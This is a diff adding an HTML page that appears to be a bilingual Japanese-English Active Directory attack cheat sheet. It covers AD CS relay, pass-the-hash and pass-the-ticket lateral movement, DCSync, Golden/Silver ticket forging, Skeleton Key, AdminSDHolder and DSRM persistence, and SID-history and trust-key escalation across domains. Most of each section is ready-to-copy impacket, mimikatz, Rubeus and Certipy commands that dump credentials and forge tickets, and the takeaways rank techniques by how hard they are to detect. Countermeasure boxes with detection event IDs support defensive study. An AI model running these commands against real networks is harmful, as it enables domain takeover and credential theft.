+  -upn administrator@contoso.local
+
+<span class="c"># 取得 pfx で認証 → Administrator NTLM hash</span>
+certipy auth -pfx administrator.pfx -dc-ip <span class="v">&lt;DC_IP&gt;</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ESC8 — Web Enrollment NTLM Relay</span>
+
+<span class="c"># Relay 側 (Kali)</span>
+sudo impacket-ntlmrelayx \
+  -t http://ca.contoso.local/certsrv/certfnsh.asp \
+  -smb2support --adcs --template 'DomainController'
+
+<span class="c"># 認証強制 (PetitPotam / DFSCoerce / printerbug)</span>
+python3 PetitPotam.py -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' <span class="v">&lt;RELAY_HOST&gt;</span> <span class="v">&lt;DC_IP&gt;</span>
+
+<span class="c"># 取得証明書で TGT</span>
+certipy auth -pfx dc01.pfx -dc-ip <span class="v">&lt;DC_IP&gt;</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Protected Users グループへ特権アカウント配置 (NTLM 拒否、Kerberos AES 強制、delegation 対象化ブロック)</li>
+          <li>特権アカウントに Account is sensitive and cannot be delegated チェック</li>
+          <li>Unconstrained Delegation は 2019+ で無効化、必要なら Constrained (Kerberos-Only) へ移行</li>
+          <li><code>ms-DS-MachineAccountQuota</code> を 0 に設定 (Domain User による machine account 追加を阻止 → RBCD 攻撃無効化)</li>
+          <li>LAPS ACL の見直し、Read All / All Extended Rights の付与範囲を最小化</li>
+          <li>CA テンプレートの SAN 属性 (<code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code>) と enroll permission を audit、ESC1-15 対応</li>
+          <li>Web Enrollment で EPA (Extended Protection for Authentication) を強制、LDAP + SMB signing 必須化</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>ACL パスは BloodHound で発見、<code>WriteDACL</code> on domain object は DCSync 権限化の直行経路</li>
+          <li>Unconstrained + Spooler / PetitPotam は DC$ TGT 捕獲 → DCSync の高速経路</li>
+          <li>RBCD は <code>ms-DS-MachineAccountQuota</code> 未 0 化ならほぼ確実に成立、Computer への GenericWrite で完結</li>
+          <li>AD CS ESC1 は SAN 指定可能 vulnerable template を発見した時点で任意ユーザ化可能</li>
+          <li>ESC8 (Web Enrollment Relay) は coercer と組み合わせ、DC 自身を認証源として利用可能</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s4" class="reveal">
+      <h2><span class="num">04</span>Lateral Movement<span class="jp">横展開</span></h2>
+      <p>取得済み hash / ticket / plaintext を用いた別ホストへの実行手段。プロトコル別 (SMB / DCOM / RDP / WinRM) の選択は検知率・要件・admin 権限有無で決まる。</p>
+
+      <h3>Pass-the-Hash (PtH)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># psexec (ADMIN$ + service install、最高検知率)</span>
+impacket-psexec -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> \
+  contoso.local/user@target.contoso.local
+
+<span class="c"># wmiexec (ADMIN$ 不要、検知低)</span>
+impacket-wmiexec -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> \
+  contoso.local/user@target.contoso.local
+
+<span class="c"># atexec (schtasks 経由、双方向出力なし)</span>
+impacket-atexec -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> \
+  contoso.local/user@target.contoso.local 'whoami'
+
+<span class="c"># smbexec (ファイル経由、双方向出力)</span>
+impacket-smbexec -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> \
+  contoso.local/user@target.contoso.local
+
+<span class="c"># dcomexec (MMC20 経由、最低テレメトリ)</span>
+impacket-dcomexec -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> -object MMC20 \
+  contoso.local/user@target.contoso.local</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># NetExec — bulk 試行 + 横展開探索</span>
+netexec smb 10.10.10.0/24 -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local --local-auth
+netexec smb 10.10.10.0/24 -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local -x 'whoami /priv'
+netexec winrm 10.10.10.0/24 -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -d contoso.local</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows — Over-PtH (mimikatz)</span>
+mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local \
+  /ntlm:<span class="v">&lt;NTLM_HASH&gt;</span> /run:"powershell.exe"
+<span class="c"># → 新プロセスは Kerberos 認証 (TGS request 時のみ NTLM 使用)</span></code></pre></div>
+
+      <h3>Pass-the-Ticket (PtT)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows — kirbi 投入</span>
+.\Rubeus.exe ptt /ticket:<span class="v">&lt;BASE64&gt;</span>
+mimikatz # kerberos::ptt ticket.kirbi
+
+<span class="c"># 既存チケットエクスポート</span>
+.\Rubeus.exe dump /service:krbtgt /nowrap
+mimikatz # sekurlsa::tickets /export</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux — kirbi → ccache</span>
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+export KRB5CCNAME=/path/to/ticket.ccache
+klist
+
+<span class="c"># Kerberos 認証で各種ツール</span>
+impacket-psexec -k -no-pass target.contoso.local
+impacket-secretsdump -k -no-pass target.contoso.local
+
+<span class="c"># HTTP negotiate</span>
+curl -k --negotiate -u : http://target.contoso.local/admin</code></pre></div>
+
+      <div class="note"><span class="lbl">前提</span>
+        <ul>
+          <li><code>/etc/hosts</code> に DC と target を FQDN で登録</li>
+          <li>Kerberos は時刻差 ±5 分以内 (<code>sudo ntpdate &lt;DC_IP&gt;</code>)</li>
+          <li><code>/etc/krb5.conf</code> に realm 設定 (<code>[realms]</code> セクション)</li>
+        </ul>
+      </div>
+
+      <h3>Pass-the-Key / Over-Pass-the-Hash</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># AES256 で TGT 取得 (RC4 より検知低)</span>
+.\Rubeus.exe asktgt /user:Administrator /domain:contoso.local \
+  /aes256:<span class="v">&lt;AES256_KEY&gt;</span> /ptt
+.\Rubeus.exe asktgt /user:Administrator /domain:contoso.local \
+  /rc4:<span class="v">&lt;NTLM_HASH&gt;</span> /ptt</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>impacket-getTGT -aesKey <span class="v">&lt;AES256_KEY&gt;</span> contoso.local/Administrator
+impacket-getTGT -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> contoso.local/Administrator</code></pre></div>
+
+      <h3>WinRM (Evil-WinRM)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># パスワード</span>
+evil-winrm -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -i target.contoso.local
+
+<span class="c"># NTLM hash</span>
+evil-winrm -u user -H <span class="v">&lt;NTLM_HASH&gt;</span> -i target.contoso.local
+
+<span class="c"># Kerberos (要 /etc/krb5.conf)</span>
+evil-winrm -r CONTOSO.LOCAL -i target.contoso.local</code></pre></div>
+
+      <h3>RDP (Restricted Admin Mode)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Restricted Admin Mode が有効な場合のみ</span>
+xfreerdp /v:target.contoso.local /u:Administrator \
+  /pth:<span class="v">&lt;NTLM_HASH&gt;</span> +compression /cert-ignore /dynamic-resolution</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c"># ターゲットで Restricted Admin 有効化 (要 admin)</span>
+reg add HKLM\System\CurrentControlSet\Control\Lsa \
+  /v DisableRestrictedAdmin /t REG_DWORD /d 0</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Credential Guard (VBS) を Enterprise SKU 上で有効化、LSASS メモリ抽出防止</li>
+          <li>Restricted Admin Mode は既定無効を維持、必要なホストのみ許可</li>
+          <li>LAPS で local admin パスワードを一意化、横展開の hash 再利用を阻止</li>
+          <li>Tier 0 (DC / DA) と Tier 1 (Server) の管理境界を厳格化、DA を workstation に Session させない</li>
+          <li>SMB signing 強制 (<code>RequireSecuritySignature=1</code>) で SMB relay 阻止</li>
+          <li>Windows Firewall で 445 / 5985 / 3389 の inbound を Tier 内に限定</li>
+          <li>Sysmon Event 1 で <code>psexec.exe</code> / <code>wmic.exe</code> の unusual parent を検知、Event 4624 の Type 3 (Network) + NtLmSsp を SIEM で aggregate</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>実行方法選択: psexec (最高検知) &lt; smbexec &lt; wmiexec &lt; atexec &lt; dcomexec (最低検知)</li>
+          <li>NetExec の bulk 実行は探索フェーズで有効、<code>--local-auth</code> は local hash 再利用検証にも使用可能</li>
+          <li>PtT は <code>-k -no-pass</code> + <code>/etc/hosts</code> FQDN 登録が前提、時刻同期は必須</li>
+          <li>Restricted Admin Mode RDP は NTLM hash で GUI ログオン可能、レジストリで有効化</li>
+          <li>Over-PtH は新プロセスで Kerberos 経路に切替、以降の hop は NTLM 痕跡を残さない</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s5" class="reveal">
+      <h2><span class="num">05</span>Persistence<span class="jp">永続化</span></h2>
+      <p>DA / DC 取得後、krbtgt / trust key / DSRM / AdminSDHolder を使った長期アクセス確保。DCSync で krbtgt を取得すれば Golden Ticket による forest-scope の永続化が完成する。</p>
+
+      <h3>DCSync</h3>
+      <p>前提: <code>Replicating Directory Changes</code> + <code>Replicating Directory Changes All</code> 権限 (DA / EA / Domain Controllers / 委任ユーザ)。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux — 全アカウント</span>
+secretsdump.py -dc-ip <span class="v">&lt;DC_IP&gt;</span> \
+  contoso.local/Administrator:'<span class="v">&lt;PASSWORD&gt;</span>'@<span class="v">&lt;DC_IP&gt;</span>
+
+<span class="c"># krbtgt のみ (Golden Ticket 用)</span>
+secretsdump.py -just-dc-user krbtgt \
+  contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'@<span class="v">&lt;DC_IP&gt;</span>
+
+<span class="c"># Hash 使用、DC NTLM のみ</span>
+secretsdump.py -hashes :<span class="v">&lt;NTLM_HASH&gt;</span> -just-dc-ntlm \
+  contoso.local/Administrator@<span class="v">&lt;DC_IP&gt;</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (mimikatz)</span>
+mimikatz # lsadump::dcsync /domain:contoso.local /all /csv
+mimikatz # lsadump::dcsync /domain:contoso.local /user:krbtgt
+mimikatz # lsadump::dcsync /domain:contoso.local /user:Administrator
+
+<span class="c"># SharpKatz (.NET、AV 回避向き)</span>
+.\SharpKatz.exe --Command dcsync --User contoso.local\krbtgt \
+  --Domain contoso.local --DomainController dc01.contoso.local</code></pre></div>
+
+      <h3>Golden Ticket (krbtgt 偽造、forest 永続化)</h3>
+      <p>取得情報: Domain SID / krbtgt NTLM (or AES256) / 任意ユーザ名 (<code>/id:500</code> = Administrator RID)。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows (mimikatz)</span>
+mimikatz # kerberos::golden \
+  /user:fakeuser \
+  /domain:contoso.local \
+  /sid:<span class="v">&lt;DOMAIN_SID&gt;</span> \
+  /krbtgt:<span class="v">&lt;KRBTGT_NTLM&gt;</span> \
+  /id:500 \
+  /ticket:golden.kirbi
+
+mimikatz # kerberos::ptt golden.kirbi</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux (impacket)</span>
+ticketer.py -nthash <span class="v">&lt;KRBTGT_NTLM&gt;</span> \
+  -domain-sid <span class="v">&lt;DOMAIN_SID&gt;</span> \
+  -domain contoso.local \
+  fakeuser
+
+export KRB5CCNAME=fakeuser.ccache
+impacket-psexec -k -no-pass dc01.contoso.local</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Rubeus (AES256 推奨、RC4 = etype 23 は監視対象)</span>
+.\Rubeus.exe golden \
+  /aes256:<span class="v">&lt;KRBTGT_AES256&gt;</span> \
+  /user:fakeuser \
+  /id:500 \
+  /domain:contoso.local \
+  /sid:<span class="v">&lt;DOMAIN_SID&gt;</span> \
+  /ptt /nowrap</code></pre></div>
+
+      <h3>Silver Ticket (サービス偽造)</h3>
+      <p>取得情報: 対象サービスアカウントの NTLM / AES (典型的には computer$ hash)。KDC 通信なしで単一サービスへのアクセスを偽造可能。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># CIFS アクセス用 Silver Ticket</span>
+mimikatz # kerberos::golden \
+  /user:Administrator \
+  /domain:contoso.local \
+  /sid:<span class="v">&lt;DOMAIN_SID&gt;</span> \
+  /target:target.contoso.local \
+  /service:cifs \
+  /rc4:<span class="v">&lt;TARGET_MACHINE_NTLM&gt;</span> \
+  /id:500 \
+  /ptt</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux</span>
+ticketer.py -nthash <span class="v">&lt;TARGET_MACHINE_NTLM&gt;</span> \
+  -domain-sid <span class="v">&lt;DOMAIN_SID&gt;</span> \
+  -domain contoso.local \
+  -spn cifs/target.contoso.local \
+  Administrator</code></pre></div>
+
+      <p>サービス別 SPN 参考:</p>
+      <ul>
+        <li><code>cifs/target.contoso.local</code> — SMB</li>
+        <li><code>host/target.contoso.local</code> — PsExec / scheduled task</li>
+        <li><code>MSSQLSvc/sql01.contoso.local:1433</code> — MSSQL</li>
+        <li><code>HTTP/web.contoso.local</code> — WinRM / IIS</li>
+        <li><code>ldap/dc01.contoso.local</code> — LDAP / DCSync</li>
+      </ul>
+
+      <h3>Skeleton Key (DC 永続化、非恒久)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># DC 上で実行 (要 DA)</span>
+mimikatz # privilege::debug
+mimikatz # misc::skeleton
+<span class="c"># → 全ユーザに対し 'mimikatz' が有効パスワード化</span>
+<span class="c"># 例: net use \\dc01.contoso.local\C$ /user:Administrator mimikatz</span>
+<span class="c"># DC 再起動で消失</span></code></pre></div>
+
+      <h3>AdminSDHolder ACL Persistence</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerView — 永続 ACL 注入</span>
+Add-DomainObjectAcl \
+  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=contoso,DC=local' \
+  -PrincipalIdentity attacker \
+  -Rights All
+
+<span class="c"># 60 分後、PDC emulator の SDPROP で ACL が全 AdminCount=1 オブジェクトへ伝播</span>
+<span class="c"># attacker は Domain Admins / Enterprise Admins 等へ All Rights 保有</span></code></pre></div>
+
+      <h3>DSRM (DC Local Admin Persistence)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># DC 上で実行</span>
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+<span class="c"># → Administrator (DSRM) hash 取得</span>
+
+<span class="c"># DSRM でネットワークログオン許可</span>
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" \
+  /v DsrmAdminLogonBehavior /t REG_DWORD /d 2</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># DSRM Administrator で PtH</span>
+impacket-psexec -hashes :<span class="v">&lt;DSRM_HASH&gt;</span> Administrator@<span class="v">&lt;DC_IP&gt;</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>krbtgt account パスワードを年 1 回 + 侵害疑いの都度 2 回連続でリセット (Golden Ticket 無効化)</li>
+          <li>Event 4769 で <code>Ticket Options: 0x40810000</code> + etype 0x17 (RC4) の異常を SIEM で aggregate</li>
+          <li>Event 4662 で AdminSDHolder GUID (<code>bf967a86-0de6-11d0-a285-00aa003049e2</code>) への ACL modification を alert</li>
+          <li>LSA Protection (<code>RunAsPPL=1</code>) + Credential Guard で DSRM / mimikatz 系メモリ抽出阻止</li>
+          <li>Golden / Silver Ticket 検知は Rubeus / mimikatz プロセス signature + Kerberos anomaly (ticket lifetime 10 years、AS-REQ なしの TGT) の組み合わせ</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>DCSync 権限保有ユーザは非 DA でも存在しうる (<code>Find-InterestingDomainAcl</code> で発見)</li>
+          <li>Golden Ticket は AES256 (etype 18) 使用で RC4 検知 (Event 4769 etype 23) を回避</li>
+          <li>Silver Ticket は KDC 通信なし (AS-REQ / TGS-REQ ログなし)、単一サービスへのアクセスに最適</li>
+          <li>Skeleton Key は DC 再起動で消失、Golden Ticket 併用で永続化担保</li>
+          <li>AdminSDHolder Persistence は SDPROP (60 分間隔) の伝播で全特権 principal に ACL 拡散、検知極めて困難</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s6" class="reveal">
+      <h2><span class="num">06</span>Impact<span class="jp">侵害拡大</span></h2>
+      <p>単一ドメインの侵害を child → parent / cross-forest に拡張する層。SID History injection と Trust Key 抽出が主軸で、fully-forest 侵害 (Enterprise Admins 化) が目標。</p>
+
+      <h3>SID History 注入 (Child → Parent)</h3>
+      <p>前提: 子ドメインの DA 取得済 + フォレスト内トラスト (双方向、SID Filter 無効化 = 同一フォレスト)。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 子 DC 上で — 子ドメイン SID + krbtgt hash 取得</span>
+mimikatz # lsadump::dcsync /domain:child.contoso.local /user:krbtgt
+<span class="c"># child SID: S-1-5-21-AAA, krbtgt hash: &lt;CHILD_KRBTGT_HASH&gt;</span>
+
+<span class="c"># 親ドメイン SID 取得</span>
+Get-DomainSID -Domain contoso.local
+<span class="c"># parent SID: S-1-5-21-BBB</span>
+
+<span class="c"># Enterprise Admins SID = parent SID + "-519"</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Golden Ticket with SID History (Enterprise Admins 注入)</span>
+mimikatz # kerberos::golden \
+  /user:Administrator \
+  /domain:child.contoso.local \
+  /sid:S-1-5-21-AAA \
+  /sids:S-1-5-21-BBB-519 \
+  /krbtgt:<span class="v">&lt;CHILD_KRBTGT_HASH&gt;</span> \
+  /ticket:cross_forest.kirbi \
+  /ptt
+
+<span class="c"># Rubeus 版</span>
+.\Rubeus.exe golden \
+  /rc4:<span class="v">&lt;CHILD_KRBTGT_HASH&gt;</span> \
+  /user:Administrator \
+  /domain:child.contoso.local \
+  /sid:S-1-5-21-AAA \
+  /sids:S-1-5-21-BBB-519 \
+  /ldap \
+  /nowrap /ptt</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 親 DC へアクセス</span>
+ls //dc01.contoso.local/c$
+impacket-psexec -k -no-pass dc01.contoso.local</code></pre></div>
+
+      <h3>Trust Key 抽出 (Cross-Forest)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 侵害済み DC 上で trust key (RC4) 取得</span>
+mimikatz # lsadump::trust /patch
+<span class="c"># Inbound trust の HASH を確認</span>
+
+<span class="c"># trust key で inter-realm TGT 偽造</span>
+mimikatz # kerberos::golden \
+  /user:Administrator \
+  /domain:contoso.local \
+  /sid:<span class="v">&lt;TRUSTED_SID&gt;</span> \
+  /sids:<span class="v">&lt;TRUSTING_SID&gt;</span>-519 \
+  /rc4:<span class="v">&lt;TRUST_KEY&gt;</span> \
+  /service:krbtgt \
+  /target:fabrikam.local \
+  /ticket:cross_forest.kirbi \
+  /ptt</code></pre></div>
+
+      <h3>ACL Cross-Domain Abuse</h3>
+      <p>Foreign Group Membership / Trust ACL 悪用。BloodHound の Cross Domain クエリで可視化。外部 principal に付与された ACL は trust 越えの侵害経路になる。</p>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Forest boundary を security boundary として扱い、不要な外部 forest trust を撤廃</li>
+          <li>SID Filtering (<code>netdom trust /quarantine:yes</code>) を全 trust で有効化 (external では既定有効、intra-forest では無効)</li>
+          <li>Selective Authentication に切替、必要 principals のみ trusted domain resource へアクセス許可</li>
+          <li>Trust password の定期ローテーション (30-60 日)、<code>nltest /trust_kerberos</code> で監査</li>
+          <li>Enterprise Admins グループの Event 4728 / 4729 (add/remove member) を SIEM で alert</li>
+          <li>各 domain の krbtgt を分離管理、child 侵害が forest root DA に伝播しない設計を検証</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>SID History (<code>/sids</code>) はフォレスト内 trust で既定 SID Filter 無効化のため成立</li>
+          <li>Trust key ベースの inter-realm TGT 偽造は cross-forest でも有効、Event 4769 で異常な service ticket (source domain ≠ requesting user domain) を検知</li>
+          <li>Foreign Group Membership は BloodHound の cross-domain クエリで可視化、trust 関係の可視化不足が典型的侵害ルート</li>
+          <li>Enterprise Admins 化 = forest root DA、Schema Admins は既定でメンバー 0 だが Schema modification 権限保有</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="ref" class="reveal">
+      <h2><span class="num">07</span>References<span class="jp">参照</span></h2>
+      <ul>
+        <li>MITRE ATT&amp;CK Enterprise Matrix — <a href="https://attack.mitre.org/matrices/enterprise/" target="_blank" rel="noopener">attack.mitre.org</a></li>
+        <li>BloodHound Cypher Cheat Sheet (hausec) — <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/" target="_blank" rel="noopener">hausec.com</a></li>
+        <li>PowerView Cheat Sheet (HarmJ0y) — <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" target="_blank" rel="noopener">gist.github.com/HarmJ0y</a></li>
+        <li>Rubeus (GhostPack) — <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">github.com/GhostPack/Rubeus</a></li>
+        <li>Powermad (Kevin Robertson) — <a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">github.com/Kevin-Robertson/Powermad</a></li>
+        <li>Certipy — <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">github.com/ly4k/Certipy</a></li>
+        <li>Certified Pre-Owned (SpecterOps) — <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener">posts.specterops.io</a></li>
+        <li>Kerberos Trust Key Forging (Sean Metcalf) — <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">adsecurity.org/?p=1640</a></li>
+        <li>The Hacker Recipes (AD) — <a href="https://www.thehacker.recipes/ad" target="_blank" rel="noopener">thehacker.recipes/ad</a></li>
+        <li>ADSecurity (Sean Metcalf) — <a href="https://adsecurity.org" target="_blank" rel="noopener">adsecurity.org</a></li>
+      </ul>
+    </section>
+
+  </article>
+</div>
+</div>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Active Directory Compromise</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
